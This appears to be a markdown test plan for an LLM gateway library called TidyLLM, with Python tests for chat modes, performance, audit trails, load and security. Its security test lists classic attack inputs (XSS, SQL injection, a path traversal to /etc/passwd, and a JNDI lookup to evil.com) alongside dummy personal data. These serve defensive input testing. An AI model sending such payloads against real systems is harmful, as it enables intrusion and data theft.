# TidyLLM New Test Plan Document
**Date:** 2025-09-17
**Purpose:** Comprehensive testing strategy with current, enhanced, and advanced test scenarios
**Status:** 🎯 ACTIVE DEVELOPMENT - Day-long testing initiative

## 🎯 Overview

This document outlines a comprehensive testing approach that builds from **current working functionality** through **enhanced validation** to **advanced enterprise scenarios**. We'll spend the day systematically validating and expanding our test coverage.

---

## 📊 Current Test Status Baseline

### ✅ Working Tests (From Previous Run)
1. **Direct Chat Mode** - 100% functional with full audit trails
2. **DSPy Chain of Thought** - Working with reasoning chains
3. **Hybrid Mode** - Intelligent routing operational
4. **Custom Mode** - Placeholder framework ready

### ⚠️ Issues Identified
1. **RAG Mode** - Missing `query` method in UnifiedRAGManager
2. **MLflow Integration** - Missing `log_llm_request` method
3. **Performance** - Variable response times (250ms to 18s)

---

## 🏗 Test Plan Structure

### CURRENT TESTS (Validate Existing)
**Goal:** Ensure all currently working features remain stable

### ENHANCED TESTS (Improve Coverage)
**Goal:** Deepen validation of existing features and fix known issues

### ADVANCED TESTS (New Capabilities)
**Goal:** Test enterprise scenarios and complex integrations

---

## 📋 CURRENT TESTS - Baseline Validation

### Current-1: Core API Stability
**Purpose:** Verify basic API functions work consistently

```python
def test_current_core_api_stability():
    """Validate core API functions work reliably"""

    # Test 1.1: Basic import and initialization
    import tidyllm
    assert tidyllm is not None

    # Test 1.2: Status endpoint
    status = tidyllm.status()
    assert isinstance(status, dict)
    assert 'status' in status
    assert 'timestamp' in status

    # Test 1.3: Model listing
    models = tidyllm.list_models()
    assert isinstance(models, list)
    assert len(models) > 0
```

### Current-2: Direct Chat Mode Consistency
**Purpose:** Ensure direct mode works reliably across multiple calls

```python
def test_current_direct_chat_consistency():
    """Test direct chat mode stability"""

    responses = []
    for i in range(5):
        response = tidyllm.chat(f"Test message {i}", chat_type="direct", reasoning=True)
        responses.append(response)

        # Validate response structure
        assert isinstance(response, dict)
        assert 'response' in response
        assert 'reasoning' in response
        assert 'audit_trail' in response
        assert 'token_usage' in response

        # Validate reasoning quality
        assert len(response['reasoning']) > 20  # Substantial reasoning
        assert 'Corporate LLM Gateway' in response['reasoning']

        # Validate audit trail completeness
        audit = response['audit_trail']
        assert 'timestamp' in audit
        assert 'user_id' in audit
        assert 'model_id' in audit
        assert audit['success'] == True

    # Test consistency across calls
    assert_response_consistency(responses)
```

### Current-3: DSPy Mode Validation
**Purpose:** Verify DSPy chain of thought processing works

```python
def test_current_dspy_mode_validation():
    """Test DSPy chain of thought functionality"""

    # Test step-by-step reasoning
    response = tidyllm.chat("Explain how to solve 2+2", chat_type="dspy", reasoning=True)

    assert isinstance(response, dict)
    assert 'response' in response
    assert 'reasoning' in response
    assert 'dspy_signature' in response
    assert 'dspy_backend' in response

    # Validate step-by-step structure
    assert 'step' in response['response'].lower()
    assert len(response['response']) > 50  # Substantial explanation

    # Test reasoning chain
    reasoning_tests = [
        "Analyze the problem step by step",
        "Break down complex reasoning",
        "Explain your thought process"
    ]

    for test_prompt in reasoning_tests:
        resp = tidyllm.chat(test_prompt, chat_type="dspy")
        assert_step_by_step_structure(resp)
```

### Current-4: Hybrid Mode Intelligence
**Purpose:** Test intelligent routing and mode selection

```python
def test_current_hybrid_mode_intelligence():
    """Test hybrid mode routing intelligence"""

    # Test cases that should route to different modes
    test_cases = [
        ("Hello", "should be simple direct"),
        ("Explain step by step how to", "should trigger DSPy"),
        ("What is machine learning?", "should attempt RAG"),
        ("Analyze this document", "should route to document processing")
    ]

    for prompt, expected_behavior in test_cases:
        response = tidyllm.chat(prompt, chat_type="hybrid")

        # All hybrid responses should work (even if underlying mode fails)
        assert response is not None
        assert len(response) > 10  # Meaningful response

        # Log routing decisions for analysis
        print(f"Prompt: '{prompt}' → Response: {response[:100]}...")
```

### Current-5: Error Handling Validation
**Purpose:** Ensure graceful error handling across all modes

```python
def test_current_error_handling():
    """Test error handling across all chat modes"""

    # Test invalid inputs
    invalid_inputs = [
        "",  # Empty string
        None,  # None input
        "A" * 10000,  # Very long input
        "🎯🚀💡" * 100,  # Unicode stress test
    ]

    for invalid_input in invalid_inputs:
        try:
            response = tidyllm.chat(invalid_input, chat_type="direct")
            # Should either work or return graceful error
            assert response is not None
        except Exception as e:
            # If exception, should be informative
            assert len(str(e)) > 10

    # Test invalid chat types
    response = tidyllm.chat("Test", chat_type="nonexistent_mode")
    assert "error" in str(response).lower() or "unknown" in str(response).lower()
```

---

## 🔧 ENHANCED TESTS - Improved Coverage

### Enhanced-1: Performance Benchmarking
**Purpose:** Establish performance baselines and identify bottlenecks

```python
def test_enhanced_performance_benchmarking():
    """Comprehensive performance testing"""

    import time

    # Test response time distribution
    response_times = []
    for i in range(20):
        start = time.time()
        response = tidyllm.chat(f"Performance test {i}", chat_type="direct")
        end = time.time()
        response_times.append(end - start)

    # Calculate statistics
    avg_time = sum(response_times) / len(response_times)
    max_time = max(response_times)
    min_time = min(response_times)

    print(f"Performance Results:")
    print(f"  Average: {avg_time:.2f}s")
    print(f"  Min: {min_time:.2f}s")
    print(f"  Max: {max_time:.2f}s")

    # Performance assertions
    assert avg_time < 10.0  # Average under 10 seconds
    assert max_time < 30.0  # No request over 30 seconds
    assert min_time > 0.1   # Sanity check

    # Test different message lengths
    length_test_results = {}
    for length in [10, 100, 500, 1000]:
        message = "x" * length
        start = time.time()
        tidyllm.chat(message, chat_type="direct")
        length_test_results[length] = time.time() - start

    # Analyze length impact
    print(f"Length Impact: {length_test_results}")
```

### Enhanced-2: RAG Mode Investigation and Fix
**Purpose:** Diagnose and potentially fix RAG mode issues

```python
def test_enhanced_rag_mode_investigation():
    """Investigate RAG mode issues and test fixes"""

    # First, reproduce the error
    try:
        response = tidyllm.chat("What is machine learning?", reasoning=True)
        print(f"RAG attempt result: {response}")

        # If it's an error response, analyze the error
        if isinstance(response, dict) and 'error' in response:
            error_msg = response['error']
            print(f"RAG Error: {error_msg}")

            # Test if error is consistent
            for i in range(3):
                retry_response = tidyllm.chat("Simple RAG test", reasoning=True)
                if isinstance(retry_response, dict) and 'error' in retry_response:
                    assert error_msg in retry_response['error']  # Consistent error

    except Exception as e:
        print(f"RAG mode exception: {e}")

    # Test RAG mode with explicit parameters
    rag_test_queries = [
        "What is artificial intelligence?",
        "Explain machine learning",
        "Define deep learning",
        "What are neural networks?"
    ]

    for query in rag_test_queries:
        try:
            response = tidyllm.chat(query, chat_type="rag" if hasattr(tidyllm, 'chat') else "default")
            print(f"RAG query '{query}' → {type(response)}")
        except Exception as e:
            print(f"RAG query '{query}' failed: {e}")
```

### Enhanced-3: Audit Trail Deep Dive
**Purpose:** Comprehensive validation of enterprise audit features

```python
def test_enhanced_audit_trail_validation():
    """Deep validation of audit trail completeness"""

    # Test audit trail across different scenarios
    test_scenarios = [
        {"message": "Simple test", "chat_type": "direct", "user_id": "test_user_1"},
        {"message": "Reasoning test", "chat_type": "dspy", "user_id": "test_user_2"},
        {"message": "Hybrid test", "chat_type": "hybrid", "user_id": "test_user_3"},
    ]

    audit_trails = []
    for scenario in test_scenarios:
        response = tidyllm.chat(
            scenario["message"],
            chat_type=scenario["chat_type"],
            reasoning=True
        )

        if isinstance(response, dict) and 'audit_trail' in response:
            audit = response['audit_trail']
            audit_trails.append(audit)

            # Validate required audit fields
            required_fields = ['timestamp', 'user_id', 'model_id', 'processing_time_ms', 'success']
            for field in required_fields:
                assert field in audit, f"Missing audit field: {field}"

            # Validate field types and values
            assert isinstance(audit['timestamp'], str)
            assert isinstance(audit['processing_time_ms'], (int, float))
            assert isinstance(audit['success'], bool)
            assert audit['processing_time_ms'] > 0

    # Test audit trail uniqueness
    timestamps = [audit['timestamp'] for audit in audit_trails]
    assert len(set(timestamps)) == len(timestamps)  # All unique timestamps

    # Test audit trail persistence (if applicable)
    print(f"Collected {len(audit_trails)} audit trails")
    for i, audit in enumerate(audit_trails):
        print(f"  Audit {i}: {audit['timestamp']} - {audit['success']}")
```

### Enhanced-4: Token Usage and Cost Tracking
**Purpose:** Validate cost tracking accuracy and completeness

```python
def test_enhanced_token_usage_tracking():
    """Comprehensive token usage and cost tracking validation"""

    # Test token tracking across different message lengths
    token_tests = [
        ("Hi", "short message"),
        ("Please explain artificial intelligence in detail", "medium message"),
        ("Write a comprehensive analysis of machine learning algorithms, including supervised learning, unsupervised learning, and reinforcement learning paradigms", "long message")
    ]

    token_results = []
    for message, description in token_tests:
        response = tidyllm.chat(message, chat_type="direct", reasoning=True)

        if isinstance(response, dict) and 'token_usage' in response:
            tokens = response['token_usage']
            token_results.append({
                'description': description,
                'message_length': len(message),
                'tokens': tokens,
                'response_length': len(response.get('response', ''))
            })

            # Validate token structure
            assert 'input' in tokens
            assert 'output' in tokens
            assert 'total' in tokens

            # Validate token math
            assert tokens['total'] == tokens['input'] + tokens['output']
            assert tokens['input'] > 0
            assert tokens['output'] > 0

    # Analyze token efficiency
    for result in token_results:
        tokens = result['tokens']
        efficiency = result['response_length'] / tokens['total']
        print(f"{result['description']}: {tokens['total']} tokens, {efficiency:.2f} chars/token")

        # Token count should roughly correlate with message length
        assert tokens['input'] >= result['message_length'] // 10  # Rough estimate
```

### Enhanced-5: Multi-Model Testing
**Purpose:** Test behavior across different available models

```python
def test_enhanced_multi_model_behavior():
    """Test chat behavior across different models"""

    # Get available models
    models = tidyllm.list_models()
    print(f"Available models: {[m.get('name', 'unknown') for m in models]}")

    # Test same prompt across different models (if model selection supported)
    test_prompt = "Explain the concept of artificial intelligence briefly"

    model_responses = {}
    for model in models[:3]:  # Test first 3 models
        model_name = model.get('name', 'unknown')
        try:
            # Try setting model preference
            tidyllm.set_model(model_name)
            response = tidyllm.chat(test_prompt, chat_type="direct")
            model_responses[model_name] = response
            print(f"Model {model_name}: Response length = {len(str(response))}")
        except Exception as e:
            print(f"Model {model_name} failed: {e}")

    # Analyze response differences
    if len(model_responses) > 1:
        response_lengths = [len(str(resp)) for resp in model_responses.values()]
        print(f"Response length variation: {min(response_lengths)} - {max(response_lengths)}")

        # All models should provide meaningful responses
        for model_name, response in model_responses.items():
            assert len(str(response)) > 20, f"Model {model_name} gave too short response"
```

---

## 🚀 ADVANCED TESTS - Enterprise Scenarios

### Advanced-1: Conversation Memory and Context
**Purpose:** Test multi-turn conversation capabilities

```python
def test_advanced_conversation_memory():
    """Test conversation memory and context preservation"""

    # Simulate multi-turn conversation
    conversation_turns = [
        ("My name is Alice and I work at TechCorp", "establishing context"),
        ("What's my name?", "name recall"),
        ("Where do I work?", "workplace recall"),
        ("I'm working on a machine learning project", "adding context"),
        ("What am I working on?", "project recall"),
        ("Summarize everything you know about me", "comprehensive recall")
    ]

    conversation_id = f"test_conv_{int(time.time())}"
    context_history = []

    for turn, (message, purpose) in enumerate(conversation_turns):
        # Build context from previous turns
        context = " | ".join(context_history) if context_history else None

        response = tidyllm.chat(
            message,
            chat_type="direct",
            context=context,
            metadata={"conversation_id": conversation_id, "turn": turn}
        )

        print(f"Turn {turn} ({purpose}): {message}")
        print(f"  Response: {response}")

        # Add to context history
        context_history.append(f"{message} → {response}")

        # Validate context preservation (manual inspection for now)
        if turn >= 1:  # After first turn
            if "name" in message.lower():
                # Should reference Alice if name was asked
                pass  # Manual validation needed
```

### Advanced-2: Document Integration Workflow
**Purpose:** Test document processing + chat integration

```python
def test_advanced_document_chat_integration():
    """Test document processing integrated with chat"""

    # Create test document content
    test_document_content = """
    Technical Specification Document

    Project: AI-Powered Customer Service
    Requirements:
    1. Natural language processing capabilities
    2. Multi-language support
    3. Integration with existing CRM
    4. Real-time response generation
    5. Escalation to human agents when needed

    Timeline: 6 months
    Budget: $500,000
    """

    # Simulate document processing
    document_summary = {
        "content": test_document_content,
        "key_points": [
            "AI-Powered Customer Service project",
            "6 month timeline",
            "$500,000 budget",
            "NLP and multi-language requirements"
        ],
        "document_type": "technical_specification"
    }

    # Test chat about the document
    document_questions = [
        ("What is this document about?", "should identify project"),
        ("What's the budget?", "should find $500,000"),
        ("How long will this take?", "should find 6 months"),
        ("What are the main requirements?", "should list NLP, multi-language, etc.")
    ]

    for question, expected in document_questions:
        response = tidyllm.chat(
            f"Based on this document: {test_document_content}\n\nQuestion: {question}",
            chat_type="direct"
        )

        print(f"Q: {question}")
        print(f"A: {response}")
        print(f"Expected: {expected}")
        print()

        # Validate document context utilization
        assert len(str(response)) > 20  # Substantial response
        # Additional validation would require semantic analysis
```

### Advanced-3: Concurrent Load Testing
**Purpose:** Test system behavior under concurrent load

```python
def test_advanced_concurrent_load():
    """Test system under concurrent request load"""

    import concurrent.futures
    import threading
    import time

    def chat_worker(worker_id, num_requests):
        """Worker function for concurrent testing"""
        results = []
        for i in range(num_requests):
            try:
                start_time = time.time()
                response = tidyllm.chat(
                    f"Worker {worker_id} request {i}",
                    chat_type="direct"
                )
                end_time = time.time()

                results.append({
                    'worker_id': worker_id,
                    'request_id': i,
                    'response_time': end_time - start_time,
                    'success': True,
                    'response_length': len(str(response))
                })
            except Exception as e:
                results.append({
                    'worker_id': worker_id,
                    'request_id': i,
                    'error': str(e),
                    'success': False
                })
        return results

    # Test with increasing concurrency
    concurrency_levels = [5, 10, 20]
    requests_per_worker = 3

    for concurrency in concurrency_levels:
        print(f"Testing concurrency level: {concurrency}")

        start_time = time.time()

        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [
                executor.submit(chat_worker, worker_id, requests_per_worker)
                for worker_id in range(concurrency)
            ]

            all_results = []
            for future in concurrent.futures.as_completed(futures):
                all_results.extend(future.result())

        end_time = time.time()
        total_time = end_time - start_time

        # Analyze results
        successful_requests = [r for r in all_results if r['success']]
        failed_requests = [r for r in all_results if not r['success']]

        success_rate = len(successful_requests) / len(all_results)
        avg_response_time = sum(r['response_time'] for r in successful_requests) / len(successful_requests) if successful_requests else 0

        print(f"  Total time: {total_time:.2f}s")
        print(f"  Success rate: {success_rate:.2%}")
        print(f"  Average response time: {avg_response_time:.2f}s")
        print(f"  Failed requests: {len(failed_requests)}")

        # Assertions for load testing
        assert success_rate >= 0.8, f"Success rate too low: {success_rate}"
        assert avg_response_time < 30.0, f"Average response time too high: {avg_response_time}"
```

### Advanced-4: Security and Data Privacy
**Purpose:** Test security features and data handling

```python
def test_advanced_security_data_privacy():
    """Test security features and data privacy compliance"""

    # Test with various types of sensitive data
    sensitive_test_cases = [
        ("My SSN is 123-45-6789", "social_security"),
        ("My credit card is 4111-1111-1111-1111", "credit_card"),
        ("My email is john.doe@company.com", "email"),
        ("My phone is (555) 123-4567", "phone"),
        ("The password is admin123", "password")
    ]

    for sensitive_input, data_type in sensitive_test_cases:
        response = tidyllm.chat(sensitive_input, chat_type="direct", reasoning=True)

        print(f"Testing {data_type}: {sensitive_input}")
        print(f"Response: {response}")

        # Analyze response for data handling
        response_str = str(response)

        # Check if sensitive data appears in response
        if data_type == "social_security" and "123-45-6789" in response_str:
            print(f"WARNING: SSN appeared in response")
        elif data_type == "credit_card" and "4111-1111-1111-1111" in response_str:
            print(f"WARNING: Credit card appeared in response")
        elif data_type == "password" and "admin123" in response_str:
            print(f"WARNING: Password appeared in response")

        # Validate audit trail doesn't contain sensitive data
        if isinstance(response, dict) and 'audit_trail' in response:
            audit_str = str(response['audit_trail'])
            # Check common sensitive patterns aren't in audit
            assert "123-45-6789" not in audit_str
            assert "4111-1111-1111-1111" not in audit_str
            assert "admin123" not in audit_str

    # Test input validation
    malicious_inputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
    ]

    for malicious_input in malicious_inputs:
        try:
            response = tidyllm.chat(malicious_input, chat_type="direct")
            # Should handle malicious input gracefully
            assert response is not None
            print(f"Malicious input handled: {malicious_input[:20]}...")
        except Exception as e:
            print(f"Malicious input caused error: {e}")
```

### Advanced-5: Enterprise Integration Simulation
**Purpose:** Simulate enterprise deployment scenarios

```python
def test_advanced_enterprise_integration():
    """Simulate enterprise integration scenarios"""

    # Simulate different enterprise use cases
    enterprise_scenarios = [
        {
            "role": "customer_service",
            "query": "How do I return a defective product?",
            "expected_features": ["policy_compliance", "audit_trail"]
        },
        {
            "role": "hr_assistant",
            "query": "What are the vacation policies?",
            "expected_features": ["confidentiality", "role_based_access"]
        },
        {
            "role": "technical_support",
            "query": "Debug network connectivity issues",
            "expected_features": ["technical_accuracy", "escalation_path"]
        },
        {
            "role": "compliance_officer",
            "query": "Review regulatory requirements for data processing",
            "expected_features": ["regulatory_compliance", "documentation"]
        }
    ]

    for scenario in enterprise_scenarios:
        print(f"Testing scenario: {scenario['role']}")

        # Add role context to query
        contextual_query = f"Acting as {scenario['role']}: {scenario['query']}"

        response = tidyllm.chat(
            contextual_query,
            chat_type="hybrid",
            reasoning=True,
            metadata={
                "role": scenario["role"],
                "enterprise_context": True,
                "compliance_required": True
            }
        )

        print(f"Query: {scenario['query']}")
        print(f"Response: {response}")

        # Validate enterprise features
        if isinstance(response, dict):
            # Check for audit trail
            assert 'audit_trail' in response or 'timestamp' in str(response)

            # Check for substantial response
            response_text = response.get('response', str(response))
            assert len(response_text) > 30

            # Role-specific validation
            if scenario['role'] == 'compliance_officer':
                # Should mention compliance or regulations
                assert any(word in response_text.lower() for word in ['compliance', 'regulation', 'policy'])

        print(f"Enterprise scenario {scenario['role']} completed\n")
```

---

## 📊 Test Execution Plan

### Day Schedule
- **Morning (9-12):** Current Tests - Validate existing functionality
- **Afternoon (1-4):** Enhanced Tests - Improve coverage and fix issues
- **Evening (5-8):** Advanced Tests - Enterprise scenarios and integration

### Success Criteria
- **Current Tests:** 100% pass rate on existing functionality
- **Enhanced Tests:** Performance baselines established, issues documented
- **Advanced Tests:** Enterprise readiness validated, integration scenarios working

### Deliverables
1. **Test Results Report** - Comprehensive results from all test levels
2. **Performance Baselines** - Response time and throughput metrics
3. **Issue Tracking** - Documented issues with severity and fix recommendations
4. **Enterprise Readiness Assessment** - Production deployment recommendations

---

## 🎯 Next Steps

1. **Execute Current Tests** - Establish baseline
2. **Run Enhanced Tests** - Identify improvements
3. **Perform Advanced Tests** - Validate enterprise readiness
4. **Document Results** - Create comprehensive test report
5. **Plan Improvements** - Based on test findings

This comprehensive test plan will give us a complete picture of TidyLLM's current capabilities and readiness for enterprise deployment!